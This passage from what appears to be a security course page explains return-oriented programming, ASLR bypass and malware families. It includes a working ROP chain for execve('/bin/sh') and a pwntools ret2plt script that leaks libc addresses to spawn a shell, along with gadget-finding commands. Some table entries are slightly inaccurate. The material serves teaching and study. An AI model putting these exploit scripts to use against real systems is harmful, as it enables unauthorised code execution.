      }), " ROP is like building with LEGO bricks. Each brick (gadget) is a tiny pre-built piece → \"move this value here,\" \"add these two,\" \"return.\" You can't make new bricks (DEP), but you can chain existing ones to build anything. A ROP chain is a sequence of these bricks that together execute arbitrary computation → all from existing code."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Concept:"
      }), " ROP chains small instruction sequences ending in ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), " (gadgets) to perform arbitrary computation. Each gadget's address is placed on the stack; ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), " pops the next gadget address and executes it."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "How gadgets work:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Gadget example:\npop rdi; ret    → at address 0x7f123456\n\nStack during ROP execution:\n[0x7f123456]    → pop rdi → rdi = next value on stack; ret → next gadget\n[0xdeadbeef]    → value loaded into rdi\n[0x7f123abc]    → next gadget address\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "421-finding-gadgets-with-ropper",
      children: "4.2.1 Finding Gadgets with ropper"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install ropper\npip install ropper\n\n# Find gadgets in libc\nropper --file /lib/i386-linux-gnu/libc.so.6 --search \"pop %\"\n\n# Find specific gadgets\nropper --file vuln --search \"pop rdi\"\nropper --file vuln --search \"ret\"\n\n# Search by instruction\nropper --file /lib/x86_64-linux-gnu/libc.so.6 --search \"int 0x80\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sample output:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "[INFO] Loaded gadgets from cache\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n\nGadgets\n=======\n\n0x000000000002a3e5: pop rdi; ret\n0x000000000002be2f: pop rsi; ret\n0x000000000002f42e: pop rdx; ret\n0x0000000000045eb0: pop rax; ret\n0x000000000002e5a4: syscall; ret\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "422-building-a-rop-chain-x86_64",
      children: "4.2.2 Building a ROP Chain (x86_64)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Call ", (0,jsx_runtime.jsx)(_components.code, {
        children: "execve(\"/bin/sh\", NULL, NULL)"
      }), ". On x86_64:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "rax = 59 (execve syscall number)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "rdi = pointer to \"/bin/sh\""
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "rsi = 0 (argv = NULL)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "rdx = 0 (envp = NULL)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: (0,jsx_runtime.jsx)(_components.code, {
          children: "syscall"
        })
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "ROP chain construction:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "import struct\n\n# Gadgets from libc (addresses relative to libc base)\npop_rdi     = 0x2a3e5    # pop rdi; ret\npop_rsi     = 0x2be2f    # pop rsi; ret\npop_rdx     = 0x2f42e    # pop rdx; ret\npop_rax     = 0x45eb0    # pop rax; ret\nsyscall_ret = 0x2e5a4    # syscall; ret\nbin_sh      = 0x17e0f3   # address of \"/bin/sh\" string in libc\nlibc_base   = 0x7ffff7dd5000  # example libc base (changes with ASLR)\n\nrop_chain = [\n    pop_rdi,  bin_sh,           # rdi = pointer to \"/bin/sh\"\n    pop_rsi,  0,                # rsi = 0\n    pop_rdx,  0,                # rdx = 0\n    pop_rax,  59,               # rax = 59 (SYS_execve)\n    syscall_ret                 # trigger syscall\n]\n\n# Build final payload: padding + ROP chain\npayload = b\"A\" * 104  # offset to return address\nfor addr in rop_chain:\n    payload += struct.pack(\"<Q\", libc_base + addr)\n\nprint(payload.hex())\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "423-practical-ropgadget-usage",
      children: "4.2.3 Practical: ROPgadget Usage"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install ROPgadget\npip install ROPgadget\n\n# Full gadget listing\nROPgadget --binary vuln\n\n# Find specific sequence\nROPgadget --binary vuln --only \"pop|ret\"\n\n# Filter for syscall gadgets\nROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --opbytes \"0f 05 c3\"\n\n# JSON output for automated exploitation\nROPgadget --binary vuln --json > gadgets.json\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "43-aslr-bypass",
      children: "4.3 ASLR Bypass"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " ASLR is like a library that moves all books to random shelves every night. Even if you know where ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " was yesterday, you can't find it today. But if you can peek at one shelf (info leak), you know where the whole section is."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "431-information-leak-techniques",
      children: "4.3.1 Information Leak Techniques"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "How It Works"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Format string"
            })
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "printf(user_input)"
            }), " reads stack values"]
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "%x%x%x%x"
            }), " leaks stack addresses"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Side channel"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Measure timing or cache behavior"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cache timing on RSA exponentiation (Meltdown/Spectre)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Out-of-bounds read"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Read beyond buffer boundary"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heartbleed (CVE-2014-0160)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Error messages"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Verbose error reveals addresses"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Debug info in production"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "/proc/ leaks"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Read /proc/self/maps on Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Direct memory layout read"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "JavaScript ASLR oracle"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time-based alignment detection in browser"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "JIT spray + timing"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "432-ret2plt-aslr-bypass-via-plt",
      children: "4.3.2 ret2plt (ASLR Bypass via PLT)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "When ASLR is on, libc addresses are unknown. But the Process Linkage Table (PLT) in the binary itself is at a known address (if no PIE). The PLT contains resolved function addresses."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Technique:"
      }), " Instead of calling ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " in libc (unknown address), call a function already in the PLT like ", (0,jsx_runtime.jsx)(_components.code, {
        children: "puts()"
      }), " to leak a libc address, then calculate ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system()"
      }), " offset."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "# Step 1: Leak puts@GOT to calculate libc base\nfrom pwn import *\n\nelf = ELF('./vuln')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\n\n# PLT and GOT addresses\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x0804843a  # address of main\n\n# First payload: call puts(puts@GOT) to print actual address of puts in libc\npayload1 = b\"A\" * 76\npayload1 += p32(puts_plt)      # return to puts@PLT\npayload1 += p32(main_addr)     # return to main after puts\npayload1 += p32(puts_got)      # argument: puts@GOT\n\n# Run → captures leaked address\np = process('./vuln')\np.sendline(payload1)\nleaked = u32(p.recv(4))\nlibc_base = leaked - libc.symbols['puts']\n\n# Step 2: Now we know libc_base, do ret2libc\nsystem_addr = libc_base + libc.symbols['system']\nbin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))\n\npayload2 = b\"A\" * 76\npayload2 += p32(system_addr)\npayload2 += b\"FAKE\"\npayload2 += p32(bin_sh_addr)\n\np.sendline(payload2)\np.interactive()\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "433-complexity-analysis",
      children: "4.3.3 Complexity Analysis"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Bypass Method"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Complexity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Success Rate"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Notes"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ret2plt info leak"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "O(1) if format string/OOB exists"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (100% if leak works)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires a leak primitive"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Brute-force (32-bit)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "O(2^16) average"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~50% after 2^16 tries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Slow but works without leak"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Brute-force (64-bit)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "O(2^28) average"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~0.00001% after 2^16 tries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Impractical"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Partial overwrite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "O(1)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate (modulo page alignment)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only works for same-page offsets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/proc/self/maps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "O(1) if readable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High if file accessible"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Direct address exposure"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-5-malware-types",
      children: "Section 5: Malware Types"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "51-malware-classification",
      children: "5.1 Malware Classification"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Malware families are like parasites in a biological ecosystem:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Virus"
        }), " → attaches to a host program (like a tapeworm)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Worm"
        }), " → self-replicates across the network (like an invasive species)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Trojan"
        }), " → disguises as something beneficial (like a cuckoo egg)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Ransomware"
        }), " → holds your data hostage (like a kidnapper)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Rootkit"
        }), " → hides its presence (like a chameleon)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Botnet"
        }), " → enslaved network (like a zombie horde)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "RAT"
        }), " → remote control (like a puppet master)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Spyware"
        }), " → watches everything (like hidden cameras)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Adware"
        }), " → unwanted advertisements (like spam mail)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Fileless"
        }), " → lives only in memory (like a ghost)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "511-virus",
      children: "5.1.1 Virus"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Infects executable files, boot sectors, or macro scripts. Requires human action (running infected program, opening infected document)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Varies → data corruption, credential theft, backdoor installation."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Modifies host file, adds self to startup, infects system binaries."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Signature-based AV, behavioral analysis (file modification patterns)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " CIH (Chernobyl) virus → overwrites BIOS, renders system unbootable."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "512-worm",
      children: "5.1.2 Worm"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Self-propagates across networks without user interaction. Exploits network services (buffer overflows, weak passwords)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " DoS (distributed), dropper for other malware, data theft."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Often no disk persistence → runs in memory, spreads aggressively."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Network traffic analysis (unusual connection patterns), IDS signatures."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Morris Worm (1988) → exploited fingerd buffer overflow, replicated via rsh/rexec."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "513-trojan",
      children: "5.1.3 Trojan"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Disguised as legitimate software (game, utility, crack). Delivered via phishing, social engineering."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Backdoor, credential stealer, downloader for additional malware."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Registry Run keys, scheduled tasks, service installation."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " AV scanning, code signing verification, behavioral analysis."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Zeus trojan → banking credential theft via web injects."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "514-ransomware",
      children: "5.1.4 Ransomware"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Phishing emails with malicious attachments, exploit kits, RDP brute-force."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Encrypts files with AES + RSA hybrid; demands ransom for decryption key."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Deletes shadow copies, disables recovery, installs as service."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " File system monitoring (mass file rename/encrypt), behavioral EDR."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " WannaCry (2017) → used EternalBlue exploit, encrypted 200K+ systems across 150 countries."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "515-rootkit",
      children: "5.1.5 Rootkit"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Installed after initial compromise (part of multi-stage attack). Can be kernel-mode or user-mode."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Hides processes, files, registry keys, network connections from system tools."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Modifies kernel data structures (DKOM), hooks syscalls, loads as kernel driver."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Memory forensics (Volatility), boot-time scanning, hardware security modules."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Sony BMG rootkit (2005) → hid DRM software via cloaking techniques."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "516-botnet",
      children: "5.1.6 Botnet"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Worm-like self-propagation or exploited machines."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " DDoS attacks, spam relay, credential cracking, cryptocurrency mining."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " IRC/HTTP C2 channel, domain flux (DGA), peer-to-peer command structure."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " C2 traffic pattern analysis (beaconing, DGA domains)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Mirai (2016) → IoT botnet, 600K+ devices, 1.2 Tbps DDoS on Dyn DNS."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "517-rat-remote-access-trojan",
      children: "5.1.7 RAT (Remote Access Trojan)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Trojan delivery (phishing, fake downloads)."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Full remote control → screen capture, keylogging, file transfer, webcam access."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Registry auto-run, service installation, DLL hijacking."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Network traffic analysis (encrypted C2 tunnel), process anomalies."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " DarkComet → full-featured RAT with keylogger, screen capture, microphone access."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "518-spyware",
      children: "5.1.8 Spyware"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Bundled with freeware, drive-by downloads, malicious browser extensions."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Monitors browsing habits, captures keystrokes, steals credentials."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " Browser helper objects, registry persistence, scheduled tasks."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Anti-spyware tools (Malwarebytes, Spybot), browser settings anomalies."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " CoolWebSearch → browser hijacker that redirects all searches."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "519-adware",
      children: "5.1.9 Adware"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Bundled with free software, fake installers."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Displays unwanted advertisements, pop-ups, in-browser ads."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Ad-blockers, anti-malware with PUP detection."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Delta Search → browser toolbar that injects ads."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "5110-fileless-malware",
      children: "5.1.10 Fileless Malware"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      }), " Exploit (e.g., PowerShell downgrade attack), malicious document macros."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload:"
      }), " Runs entirely in memory → PowerShell scripts, WMI persistence, .NET assemblies."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Persistence:"
      }), " WMI event subscriptions, registry run keys (minimal), scheduled tasks."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      }), " Process tree analysis, PowerShell script block logging (Event ID 4104), memory forensics."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example:"
      }), " Kovter → used PowerShell for execution, stored payload in registry."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "52-malware-types-comparison-table",
      children: "5.2 Malware Types Comparison Table"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Propagation"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Payload"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detection Difficulty"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Defense"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Virus"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File infection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Infected host files"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Varied"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (signature match)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AV, patch management"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Worm"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network self-propagation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Often memory-only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS, dropper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (network patterns)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Segment network, patch"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
